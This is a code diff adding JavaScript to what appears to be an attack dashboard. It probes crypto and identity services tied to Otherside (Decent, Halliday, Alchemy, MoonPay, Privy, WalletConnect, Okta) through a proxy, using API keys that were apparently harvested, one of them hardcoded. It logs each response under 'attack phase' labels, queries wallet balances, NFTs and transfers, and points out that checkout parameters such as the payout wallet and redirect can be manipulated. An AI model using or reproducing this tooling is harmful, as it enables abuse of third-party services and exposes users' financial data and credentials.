+                    })
+                });
+                const result = await resp.json();
+                log(cId, `Status: ${result.status}`, 'info');
+                log(cId, `Response: ${JSON.stringify(result.data, null, 2).substring(0, 1000)}`, 'data');
+                stats.endpoints++; updateStats();
+                saveToOthersideDB({ os_attack_phase: 'decent_swap_test', os_response_data: JSON.stringify(result.data).substring(0, 2000), os_target_endpoint: 'decent/api/v1/route' });
+            } catch(e) { log(cId, `Exception: ${e.message}`, 'error'); }
+        }
+
+        async function testDecentRoute() {
+            const cId = 'decentLog';
+            const apiKey = document.getElementById('decentApiKey').value;
+            const srcChain = document.getElementById('decentSrcChain').value;
+            const dstChain = document.getElementById('decentDstChain').value;
+            const srcToken = document.getElementById('decentSrcToken').value;
+            const dstToken = document.getElementById('decentDstToken').value;
+            const amount = document.getElementById('decentAmount').value;
+            const wallet = document.getElementById('decentWallet').value;
+            log(cId, `Getting route: ${srcChain} → ${dstChain}...`, 'info');
+            try {
+                const resp = await fetch('/api/proxy', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        endpoint: `api/v1/route?src_chain_id=${srcChain}&dst_chain_id=${dstChain}&src_token_addr=${srcToken}&dst_token_addr=${dstToken}&amount=${amount}&wallet_address=${wallet}`,
+                        method: 'GET',
+                        targetBase: 'decent',
+                        extraHeaders: { 'x-api-key': apiKey }
+                    })
+                });
+                const result = await resp.json();
+                log(cId, `Status: ${result.status}`, result.status === 200 ? 'success' : 'warning');
+                log(cId, `Route: ${JSON.stringify(result.data, null, 2).substring(0, 2000)}`, 'data');
+                stats.endpoints++; stats.discovered++; updateStats();
+                saveToOthersideDB({ os_attack_phase: 'decent_route', os_response_data: JSON.stringify(result.data).substring(0, 2000), os_target_endpoint: `decent/api/v1/route?src=${srcChain}&dst=${dstChain}` });
+            } catch(e) { log(cId, `Exception: ${e.message}`, 'error'); }
+        }
+
+        function generateDecentPayload() {
+            const srcChain = document.getElementById('decentSrcChain').value;
+            const dstChain = document.getElementById('decentDstChain').value;
+            const srcToken = document.getElementById('decentSrcToken').value;
+            const dstToken = document.getElementById('decentDstToken').value;
+            const amount = document.getElementById('decentAmount').value;
+            const wallet = document.getElementById('decentWallet').value;
+            const payload = { src_chain_id: parseInt(srcChain), dst_chain_id: parseInt(dstChain), src_token_addr: srcToken, dst_token_addr: dstToken, amount: amount, wallet_address: wallet };
+            log('decentLog', `Generated Decent payload:
+${JSON.stringify(payload, null, 2)}`, 'data');
+            log('decentLog', `API URL: GET /api/v1/route?${new URLSearchParams({src_chain_id: srcChain, dst_chain_id: dstChain, src_token_addr: srcToken, dst_token_addr: dstToken, amount: amount, wallet_address: wallet}).toString()}`, 'info');
+        }
+
+        async function testDecentStatus() {
+            const cId = 'decentLog';
+            const apiKey = document.getElementById('decentApiKey').value;
+            log(cId, 'Checking Decent API status...', 'info');
+            try {
+                const resp = await fetch('/api/proxy', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ endpoint: 'api/v1/status', method: 'GET', targetBase: 'decent', extraHeaders: { 'x-api-key': apiKey } })
+                });
+                const result = await resp.json();
+                log(cId, `Status: ${result.status} → ${JSON.stringify(result.data, null, 2).substring(0, 500)}`, result.status === 200 ? 'success' : 'warning');
+                stats.endpoints++; updateStats();
+            } catch(e) { log(cId, `Exception: ${e.message}`, 'error'); }
+        }
+
+        // ===================================================================
+        // API HUB: HALLIDAY
+        // ===================================================================
+        async function testHallidayAPI() {
+            const cId = 'hallidayLog';
+            const apiKey = document.getElementById('hallidayApiKey').value;
+            log(cId, 'Testing Halliday API (list chains)...', 'info');
+            try {
+                const resp = await fetch('/api/proxy', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ endpoint: 'v2/chains', method: 'GET', targetBase: 'halliday', extraHeaders: { 'x-halliday-key': apiKey } })
+                });
+                const result = await resp.json();
+                log(cId, `Status: ${result.status}`, 'info');
+                log(cId, `Chains: ${JSON.stringify(result.data, null, 2).substring(0, 2000)}`, 'data');
+                stats.endpoints++; stats.discovered++; updateStats();
+                saveToOthersideDB({ os_attack_phase: 'halliday_chains', os_response_data: JSON.stringify(result.data).substring(0, 2000), os_target_endpoint: 'halliday/v2/chains' });
+            } catch(e) { log(cId, `Exception: ${e.message}`, 'error'); }
+        }
+
+        async function testHallidayChains() { testHallidayAPI(); }
+
+        async function testHallidayWallet() {
+            const cId = 'hallidayLog';
+            const apiKey = document.getElementById('hallidayApiKey').value;
+            const chain = document.getElementById('hallidayChain').value;
+            const player = document.getElementById('hallidayPlayer').value;
+            log(cId, `Creating/getting smart account on ${chain}...`, 'info');
+            try {
+                const resp = await fetch('/api/proxy', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        endpoint: `v2/wallet?blockchain=${chain}&player_id=${player}`,
+                        method: 'GET',
+                        targetBase: 'halliday',
+                        extraHeaders: { 'x-halliday-key': apiKey }
+                    })
+                });
+                const result = await resp.json();
+                log(cId, `Smart Account: ${JSON.stringify(result.data, null, 2).substring(0, 2000)}`, 'data');
+                stats.endpoints++; updateStats();
+                saveToOthersideDB({ os_attack_phase: 'halliday_wallet', os_response_data: JSON.stringify(result.data).substring(0, 2000), os_target_endpoint: `halliday/v2/wallet?blockchain=${chain}` });
+            } catch(e) { log(cId, `Exception: ${e.message}`, 'error'); }
+        }
+
+        async function executeHallidayAction() {
+            const action = document.getElementById('hallidayAction').value;
+            if (action === 'chains') { testHallidayAPI(); return; }
+            if (action === 'wallet') { testHallidayWallet(); return; }
+            const cId = 'hallidayLog';
+            const apiKey = document.getElementById('hallidayApiKey').value;
+            const chain = document.getElementById('hallidayChain').value;
+            const player = document.getElementById('hallidayPlayer').value;
+            log(cId, `Executing Halliday action: ${action}...`, 'info');
+            try {
+                const endpoint = action === 'balance' ? `v2/balance?blockchain=${chain}&player_id=${player}` : `v2/${action}`;
+                const resp = await fetch('/api/proxy', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ endpoint, method: 'GET', targetBase: 'halliday', extraHeaders: { 'x-halliday-key': apiKey } })
+                });
+                const result = await resp.json();
+                log(cId, `Result: ${JSON.stringify(result.data, null, 2).substring(0, 2000)}`, 'data');
+                stats.endpoints++; updateStats();
+                saveToOthersideDB({ os_attack_phase: `halliday_${action}`, os_response_data: JSON.stringify(result.data).substring(0, 2000), os_target_endpoint: `halliday/${endpoint}` });
+            } catch(e) { log(cId, `Exception: ${e.message}`, 'error'); }
+        }
+
+        function generateHallidayPayload() {
+            const chain = document.getElementById('hallidayChain').value;
+            const player = document.getElementById('hallidayPlayer').value;
+            const payload = { blockchain: chain, player_id: player };
+            log('hallidayLog', `Generated Halliday payload:
+${JSON.stringify(payload, null, 2)}`, 'data');
+        }
+
+        // ===================================================================
+        // API HUB: ALCHEMY
+        // ===================================================================
+        async function testAlchemyAPI() {
+            const cId = 'alchemyLog';
+            const apiKey = document.getElementById('alchemyApiKey').value;
+            log(cId, 'Testing Alchemy Ethereum RPC (eth_blockNumber)...', 'info');
+            try {
+                const resp = await fetch('/api/proxy', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        endpoint: `${apiKey}/`,
+                        method: 'POST',
+                        targetBase: 'alchemy',
+                        body: { jsonrpc: '2.0', id: 1, method: 'eth_blockNumber', params: [] }
+                    })
+                });
+                const result = await resp.json();
+                log(cId, `Block Number: ${JSON.stringify(result.data, null, 2).substring(0, 500)}`, result.data?.result ? 'success' : 'warning');
+                stats.endpoints++; stats.discovered++; updateStats();
+                saveToOthersideDB({ os_attack_phase: 'alchemy_rpc', os_response_data: JSON.stringify(result.data).substring(0, 2000), os_target_endpoint: 'alchemy/eth_blockNumber' });
+            } catch(e) { log(cId, `Exception: ${e.message}`, 'error'); }
+        }
+
+        async function testAlchemyNFT() {
+            const cId = 'alchemyLog';
+            const apiKey = document.getElementById('alchemyApiKey').value;
+            const addr = document.getElementById('alchemyAddr').value;
+            log(cId, `Querying NFTs for ${addr.substring(0, 10)}...`, 'info');
+            try {
+                const resp = await fetch('/api/proxy', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        endpoint: `${apiKey}/getNFTsForOwner?owner=${addr}`,
+                        method: 'GET',
+                        targetBase: 'alchemy',
+                        extraHeaders: { 'Content-Type': 'application/json' }
+                    })
+                });
+                const result = await resp.json();
+                log(cId, `NFTs: ${JSON.stringify(result.data, null, 2).substring(0, 2000)}`, 'data');
+                stats.endpoints++; updateStats();
+                saveToOthersideDB({ os_attack_phase: 'alchemy_nft', os_response_data: JSON.stringify(result.data).substring(0, 2000), os_target_endpoint: 'alchemy/getNFTsForOwner' });
+            } catch(e) { log(cId, `Exception: ${e.message}`, 'error'); }
+        }
+
+        async function testAlchemyBalance() {
+            const cId = 'alchemyLog';
+            const apiKey = document.getElementById('alchemyApiKey').value;
+            const addr = document.getElementById('alchemyAddr').value;
+            log(cId, `Checking balance for ${addr.substring(0, 10)}...`, 'info');
+            try {
+                const resp = await fetch('/api/proxy', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        endpoint: `${apiKey}/`,
+                        method: 'POST',
+                        targetBase: 'alchemy',
+                        body: { jsonrpc: '2.0', id: 1, method: 'eth_getBalance', params: [addr, 'latest'] }
+                    })
+                });
+                const result = await resp.json();
+                const bal = result.data?.result;
+                if (bal) { log(cId, `Balance (wei): ${bal}`, 'success'); log(cId, `Balance (ETH): ${parseInt(bal, 16) / 1e18}`, 'success'); }
+                else log(cId, `Response: ${JSON.stringify(result.data, null, 2).substring(0, 500)}`, 'warning');
+                stats.endpoints++; updateStats();
+                saveToOthersideDB({ os_attack_phase: 'alchemy_balance', os_response_data: JSON.stringify(result.data).substring(0, 2000), os_target_endpoint: 'alchemy/eth_getBalance' });
+            } catch(e) { log(cId, `Exception: ${e.message}`, 'error'); }
+        }
+
+        async function testAlchemyApeChain() {
+            const cId = 'alchemyLog';
+            const apiKey = document.getElementById('alchemyApiKey').value;
+            log(cId, 'Testing Alchemy ApeChain RPC...', 'info');
+            try {
+                const resp = await fetch('/api/proxy', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        endpoint: `${apiKey}/`,
+                        method: 'POST',
+                        targetBase: 'alchemy-ape',
+                        body: { jsonrpc: '2.0', id: 1, method: 'eth_blockNumber', params: [] }
+                    })
+                });
+                const result = await resp.json();
+                log(cId, `ApeChain Block: ${JSON.stringify(result.data, null, 2).substring(0, 500)}`, 'data');
+                stats.endpoints++; updateStats();
+                saveToOthersideDB({ os_attack_phase: 'alchemy_apechain', os_response_data: JSON.stringify(result.data).substring(0, 2000), os_target_endpoint: 'alchemy-ape/eth_blockNumber' });
+            } catch(e) { log(cId, `Exception: ${e.message}`, 'error'); }
+        }
+
+        async function executeAlchemyQuery() {
+            const queryType = document.getElementById('alchemyQueryType').value;
+            if (queryType === 'blockNumber') { testAlchemyAPI(); return; }
+            if (queryType === 'balance') { testAlchemyBalance(); return; }
+            if (queryType === 'nft') { testAlchemyNFT(); return; }
+            const cId = 'alchemyLog';
+            const apiKey = document.getElementById('alchemyApiKey').value;
+            const addr = document.getElementById('alchemyAddr').value;
+            log(cId, `Executing Alchemy query: ${queryType}...`, 'info');
+            try {
+                let endpoint, method, body = null;
+                if (queryType === 'tokenBalance') {
+                    endpoint = `${apiKey}/`;
+                    method = 'POST';
+                    body = { jsonrpc: '2.0', id: 1, method: 'alchemy_getTokenBalances', params: [addr, 'DEFAULT_TOKENS'] };
+                } else if (queryType === 'tokenMetadata') {
+                    endpoint = `${apiKey}/`;
+                    method = 'POST';
+                    body = { jsonrpc: '2.0', id: 1, method: 'alchemy_getTokenMetadata', params: [addr] };
+                } else if (queryType === 'assetTransfers') {
+                    endpoint = `${apiKey}/`;
+                    method = 'POST';
+                    body = { jsonrpc: '2.0', id: 1, method: 'alchemy_getAssetTransfers', params: [{ fromBlock: '0x0', toBlock: 'latest', toAddress: addr, category: ['external', 'internal', 'erc20', 'erc721', 'erc1155'] }] };
+                }
+                const resp = await fetch('/api/proxy', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ endpoint, method, targetBase: 'alchemy', body })
+                });
+                const result = await resp.json();
+                log(cId, `Result: ${JSON.stringify(result.data, null, 2).substring(0, 2000)}`, 'data');
+                stats.endpoints++; updateStats();
+                saveToOthersideDB({ os_attack_phase: `alchemy_${queryType}`, os_response_data: JSON.stringify(result.data).substring(0, 2000), os_target_endpoint: `alchemy/${queryType}` });
+            } catch(e) { log(cId, `Exception: ${e.message}`, 'error'); }
+        }
+
+        function generateAlchemyPayload() {
+            const queryType = document.getElementById('alchemyQueryType').value;
+            const addr = document.getElementById('alchemyAddr').value;
+            const payloads = {
+                blockNumber: { jsonrpc: '2.0', id: 1, method: 'eth_blockNumber', params: [] },
+                balance: { jsonrpc: '2.0', id: 1, method: 'eth_getBalance', params: [addr, 'latest'] },
+                tokenBalance: { jsonrpc: '2.0', id: 1, method: 'alchemy_getTokenBalances', params: [addr, 'DEFAULT_TOKENS'] },
+                tokenMetadata: { jsonrpc: '2.0', id: 1, method: 'alchemy_getTokenMetadata', params: [addr] },
+            };
+            const payload = payloads[queryType] || payloads.blockNumber;
+            log('alchemyLog', `Generated Alchemy ${queryType} payload:
+${JSON.stringify(payload, null, 2)}`, 'data');
+        }
+
+        let alchemyWs = null;
+        function connectAlchemyWS() {
+            const apiKey = document.getElementById('alchemyApiKey').value;
+            const cId = 'alchemyLog';
+            log(cId, 'Connecting to Alchemy WebSocket...', 'info');
+            try {
+                alchemyWs = new WebSocket(`wss://eth-mainnet.g.alchemy.com/v2/${apiKey}`);
+                alchemyWs.onopen = () => { log(cId, 'Connected to Alchemy WS!', 'success'); alchemyWs.send(JSON.stringify({ jsonrpc: '2.0', id: 1, method: 'eth_subscribe', params: ['newHeads'] })); };
+                alchemyWs.onmessage = (e) => { log(cId, `WS Message: ${e.data.substring(0, 300)}`, 'data'); stats.packets++; updateStats(); };
+                alchemyWs.onerror = (e) => { log(cId, 'WS Error', 'error'); };
+                alchemyWs.onclose = () => { log(cId, 'WS Closed', 'warning'); };
+            } catch(e) { log(cId, `Exception: ${e.message}`, 'error'); }
+        }
+
+        // ===================================================================
+        // API HUB: MOONPAY
+        // ===================================================================
+        async function testMoonPayAPI() {
+            const cId = 'moonpayLog';
+            const apiKey = document.getElementById('moonpayKeySelect').value;
+            const isSandbox = apiKey.startsWith('pk_test_');
+            const base = isSandbox ? 'moonpay-sandbox' : 'moonpay';
+            log(cId, `Testing MoonPay API (${isSandbox ? 'sandbox' : 'live'})...`, 'info');
+            try {
+                const resp = await fetch('/api/proxy', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ endpoint: `v1/currencies?apiKey=${apiKey}`, method: 'GET', targetBase: base })
+                });
+                const result = await resp.json();
+                log(cId, `Currencies: ${JSON.stringify(result.data, null, 2).substring(0, 2000)}`, 'data');
+                stats.endpoints++; stats.discovered++; updateStats();
+                saveToOthersideDB({ os_attack_phase: 'moonpay_currencies', os_response_data: JSON.stringify(result.data).substring(0, 2000), os_target_endpoint: `${base}/v1/currencies` });
+            } catch(e) { log(cId, `Exception: ${e.message}`, 'error'); }
+        }
+
+        async function testMoonPayCurrencies() { testMoonPayAPI(); }
+
+        async function executeMoonPayQuery() {
+            const queryType = document.getElementById('moonpayQueryType').value;
+            if (queryType === 'currencies') { testMoonPayAPI(); return; }
+            const cId = 'moonpayLog';
+            const apiKey = document.getElementById('moonpayKeySelect').value;
+            const isSandbox = apiKey.startsWith('pk_test_');
+            const base = isSandbox ? 'moonpay-sandbox' : 'moonpay';
+            const wallet = document.getElementById('moonpayWallet').value;
+            log(cId, `MoonPay ${queryType}...`, 'info');
+            try {
+                let endpoint = queryType === 'transactions' ? `v1/transactions?apiKey=${apiKey}&walletAddress=${wallet}` : `v1/currencies?apiKey=${apiKey}`;
+                const resp = await fetch('/api/proxy', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ endpoint, method: 'GET', targetBase: base })
+                });
+                const result = await resp.json();
+                log(cId, `Result: ${JSON.stringify(result.data, null, 2).substring(0, 2000)}`, 'data');
+                stats.endpoints++; updateStats();
+            } catch(e) { log(cId, `Exception: ${e.message}`, 'error'); }
+        }
+
+        function generateMoonPayWidget() {
+            const apiKey = document.getElementById('moonpayKeySelect').value;
+            const wallet = document.getElementById('moonpayWallet').value;
+            const currency = document.getElementById('moonpayCurrency').value;
+            const url = `https://buy.moonpay.com?apiKey=${apiKey}&walletAddress=${wallet}&currencyCode=${currency}`;
+            log('moonpayLog', `Widget URL:
+${url}`, 'success');
+            log('moonpayLog', `
+This URL opens a hosted checkout page. Parameters can be manipulated (walletAddress, currencyCode, redirectURL).`, 'warning');
+        }
+
+        // ===================================================================
+        // API HUB: PRIVY
+        // ===================================================================
+        async function testPrivyAPI() {
+            const cId = 'privyLog';
+            const appId = document.getElementById('privyAppId').value;
+            log(cId, `Testing Privy OIDC discovery for app ${appId}...`, 'info');
+            try {
+                const resp = await fetch('/api/proxy', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ endpoint: '.well-known/openid-configuration', method: 'GET', targetBase: 'privy' })
+                });
+                const result = await resp.json();
+                log(cId, `OIDC Config: ${JSON.stringify(result.data, null, 2).substring(0, 2000)}`, 'data');
+                stats.endpoints++; updateStats();
+                saveToOthersideDB({ os_attack_phase: 'privy_oidc', os_response_data: JSON.stringify(result.data).substring(0, 2000), os_target_endpoint: 'privy/.well-known/openid-configuration' });
+            } catch(e) { log(cId, `Exception: ${e.message}`, 'error'); }
+        }
+
+        async function testPrivyOIDC() { testPrivyAPI(); }
+
+        async function testPrivyLogin() {
+            const cId = 'privyLog';
+            const appId = document.getElementById('privyAppId').value;
+            const clientId = document.getElementById('privyClientId').value;
+            log(cId, `Testing Privy login flow...`, 'info');
+            log(cId, `App ID: ${appId}`, 'info');
+            log(cId, `Client ID: ${clientId}`, 'info');
+            log(cId, `Connector: io.useglyph.privy`, 'info');
+            log(cId, `Auth URL: https://auth.privy.io/v1/auth/login`, 'info');
+            log(cId, `Verify URL: https://auth.privy.io/v1/auth/verify`, 'info');
+            log(cId, `
+Note: Privy auth requires browser-based OAuth flow. The dashboard can only test the OIDC discovery endpoint.`, 'warning');
+            try {
+                const resp = await fetch('/api/proxy', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ endpoint: `v1/auth/login`, method: 'POST', targetBase: 'privy', body: { app_id: appId, client_id: clientId } })
+                });
+                const result = await resp.json();
+                log(cId, `Login test: ${JSON.stringify(result.data, null, 2).substring(0, 1000)}`, result.status === 200 ? 'success' : 'warning');
+                stats.endpoints++; updateStats();
+            } catch(e) { log(cId, `Exception: ${e.message}`, 'error'); }
+        }
+
+        async function testPrivyUsers() {
+            const cId = 'privyLog';
+            log(cId, 'User enumeration requires service-side API key (not public client ID).', 'warning');
+            log(cId, 'The Client ID is public and safe to share. The App ID is also public-facing.', 'info');
+            log(cId, 'GET https://api.privy.io/v1/users requires a server-side secret.', 'warning');
+        }
+
+        // ===================================================================
+        // API HUB: WALLETCONNECT
+        // ===================================================================
+        async function testWalletConnect() {
+            const cId = 'wcLog';
+            const projectId = document.getElementById('wcProjectId').value;
+            log(cId, `Testing WalletConnect Explorer API (project: ${projectId.substring(0, 8)}...)...`, 'info');
+            try {
+                const resp = await fetch('/api/proxy', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ endpoint: `v3/wallets?projectId=${projectId}`, method: 'GET', targetBase: 'walletconnect' })
+                });
+                const result = await resp.json();
+                log(cId, `Wallets: ${JSON.stringify(result.data, null, 2).substring(0, 2000)}`, 'data');
+                stats.endpoints++; stats.discovered++; updateStats();
+                saveToOthersideDB({ os_attack_phase: 'wc_explorer', os_response_data: JSON.stringify(result.data).substring(0, 2000), os_target_endpoint: 'walletconnect/v3/wallets' });
+            } catch(e) { log(cId, `Exception: ${e.message}`, 'error'); }
+        }
+
+        async function testWCRelay() {
+            const cId = 'wcLog';
+            log(cId, 'WalletConnect relay uses Waku protocol over WebSocket.', 'info');
+            log(cId, 'Relay URL: wss://relay.walletconnect.com', 'info');
+            log(cId, 'Connection requires: projectId query parameter + proper WC session handshake.', 'warning');
+            log(cId, 'Attempting HTTP check...', 'info');
+            try {
+                const resp = await fetch('/api/proxy', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ endpoint: `v3/wallets?projectId=${document.getElementById('wcProjectId').value}`, method: 'GET', targetBase: 'walletconnect' })
+                });
+                const result = await resp.json();
+                log(cId, `Explorer API: ${result.status} — ${result.ok ? 'REACHABLE' : 'BLOCKED'}`, result.status === 200 ? 'success' : 'warning');
+                stats.endpoints++; updateStats();
+            } catch(e) { log(cId, `Exception: ${e.message}`, 'error'); }
+        }
+
+        async function testWCExplorer() { testWalletConnect(); }
+
+        function connectWCRelayWS() {
+            const cId = 'wcLog';
+            const projectId = document.getElementById('wcProjectId').value;
+            log(cId, `Connecting to WC relay: wss://relay.walletconnect.com?projectId=${projectId.substring(0, 8)}...`, 'info');
+            try {
+                const ws = new WebSocket(`wss://relay.walletconnect.com?projectId=${projectId}`);
+                ws.onopen = () => { log(cId, 'Connected to WalletConnect relay!', 'success'); stats.sessions++; updateStats(); };
+                ws.onmessage = (e) => { log(cId, `WS: ${e.data.substring(0, 300)}`, 'data'); stats.packets++; updateStats(); };
+                ws.onerror = () => { log(cId, 'WS connection error', 'error'); };
+                ws.onclose = () => { log(cId, 'WS closed', 'warning'); };
+            } catch(e) { log(cId, `Exception: ${e.message}`, 'error'); }
+        }
+
+        // ===================================================================
+        // API HUB: OKTA
+        // ===================================================================
+        async function testOktaOIDC() {
+            const cId = 'oktaLog';
+            const baseUrl = document.getElementById('oktaBaseUrl').value;
+            log(cId, `Discovering Okta OIDC: ${baseUrl}/.well-known/openid-configuration`, 'info');
+            try {
+                const resp = await fetch('/api/proxy', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ endpoint: '.well-known/openid-configuration', method: 'GET', targetBase: 'okta' })
+                });
+                const result = await resp.json();
+                log(cId, `OIDC Config: ${JSON.stringify(result.data, null, 2).substring(0, 2000)}`, 'data');
+                stats.endpoints++; stats.discovered++; updateStats();
+                saveToOthersideDB({ os_attack_phase: 'okta_oidc', os_response_data: JSON.stringify(result.data).substring(0, 2000), os_target_endpoint: 'okta/.well-known/openid-configuration' });
+            } catch(e) { log(cId, `Exception: ${e.message}`, 'error'); }
+        }
+
+        async function testOktaDiscovery() { testOktaOIDC(); }
+
+        async function testOktaAuthorize() {
+            const cId = 'oktaLog';
+            const clientId = document.getElementById('oktaClientId').value;
+            const baseUrl = document.getElementById('oktaBaseUrl').value;
+            const authUrl = `${baseUrl}/oauth2/v1/authorize?client_id=${clientId}&response_type=code&scope=openid+profile+email&redirect_uri=https://www.otherside.xyz/callback&state=test123`;
+            log(cId, `Authorize URL:
+${authUrl}`, 'info');
+            log(cId, 'Note: This URL starts an OAuth2 flow. Opening it would redirect to Okta login.', 'warning');
+        }
+
+        async function testOktaToken() {
+            const cId = 'oktaLog';
+            const clientId = document.getElementById('oktaClientId').value;
+            log(cId, `Token exchange requires authorization code from the OAuth2 flow.`, 'warning');
+            log(cId, `Token URL: ${document.getElementById('oktaBaseUrl').value}/oauth2/v1/token`, 'info');
+            log(cId, `Client ID: ${clientId}`, 'info');
+        }
+
+        // ===================================================================
+        // API HUB: APECHAIN
+        // ===================================================================
+        async function testApeChainRPC() {
+            const cId = 'decentLog';
+            const apiKey = document.getElementById('alchemyApiKey')?.value || 'dgxI2ii2PLuli6jpueq5qx7SFuilbHB1';
+            log(cId, 'Testing ApeChain RPC via Alchemy...', 'info');
+            try {
+                const resp = await fetch('/api/proxy', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        endpoint: `${apiKey}/`,
+                        method: 'POST',
+                        targetBase: 'alchemy-ape',
+                        body: { jsonrpc: '2.0', id: 1, method: 'eth_blockNumber', params: [] }
+                    })
+                });
+                const result = await resp.json();
+                log(cId, `ApeChain Block: ${JSON.stringify(result.data, null, 2).substring(0, 500)}`, 'data');
+                stats.endpoints++; updateStats();
+                saveToOthersideDB({ os_attack_phase: 'apechain_rpc', os_response_data: JSON.stringify(result.data).substring(0, 2000), os_target_endpoint: 'alchemy-ape/eth_blockNumber' });
+            } catch(e) { log(cId, `Exception: ${e.message}`, 'error'); }
+        }
+
+        // ===================================================================
+        // UTILITY: Wallet Address Helper
+        // ===================================================================
+        function useWalletAddress(targetId) {
+            const addr = '0x' + Array.from({length: 40}, () => '0123456789abcdef'[Math.floor(Math.random() * 16)]).join('');
+            document.getElementById(targetId).value = addr;
+            log(targetId.replace('Wallet', 'Log').replace('Addr', 'Log'), `Generated wallet: ${addr}`, 'success');
+        }
+
     </script>
 </body>
 </html>
